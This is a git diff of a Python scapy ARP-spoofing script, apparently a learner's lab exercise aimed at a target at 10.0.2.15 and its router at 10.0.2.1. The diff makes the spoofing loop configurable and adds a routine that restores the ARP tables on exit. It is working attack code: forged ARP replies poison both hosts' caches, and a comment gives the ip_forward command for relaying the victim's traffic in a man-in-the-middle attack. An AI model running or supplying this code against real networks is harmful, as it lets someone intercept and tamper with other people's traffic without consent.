@@ -16,6 +16,9 @@ def spoof(taget_ip, router_ip):
     # (should be the mac address of the host after running)
     scapy.send(packet, verbose = False)
 
+def restore_arp(target_ip, router_ip):
+    packet = scapy.ARP(op=2,pdst=target_ip, hwdst=get_mac(target_ip), psrc = router_ip, hwsrc = get_mac(router_ip))
+    scapy.send(packet, verbose = False)
 
 # scan ip and get the mac, same function from scan_network program
 def get_mac(ipadress):
@@ -44,13 +47,25 @@ def get_mac(ipadress):
     return answered_list[0][1].hwsrc;
 
 count =0;
-while True:
-    # mac address of router change back to the real mac everytime. So have to loop
-    # until finish the attack to constanly inject mac address to fake routers mac with
-    # hosts mac in the taget system
-    spoof("10.0.2.15","10.0.2.1")
-    # fooling the router to get the responses
-    spoof("10.0.2.1","10.0.2.15")
-    count+=2
-    print("\r[+] Packets sent : " + str(count) , end = " ")
-    time.sleep(2)
+taget_ip = "10.0.2.15"
+router_ip = "10.0.2.1"
+try:
+    while True:
+        # mac address of router change back to the real mac everytime. So have to loop
+        # until finish the attack to constanly inject mac address to fake routers mac with
+        # hosts mac in the taget system
+        spoof(taget_ip, router_ip)
+        # fooling the router to get the responses
+        spoof(router_ip, taget_ip)
+        count+=2
+        print("\r[+] Packets sent : " + str(count) , end = " ")
+        time.sleep(2)
+except KeyboardInterrupt:
+    print("\n\n[-] Ending the attack")
+    # resetting the target and router mac to real ones, cus I am nice
+    print("[-] Restoring the ARP tables")
+    restore_arp(taget_ip, router_ip)
+    restore_arp(router_ip, taget_ip)
+
+# ip forward using this command echo 1 > /proc/sys/net/ipv4/ip_forward
+# for the victim to communicate to the network
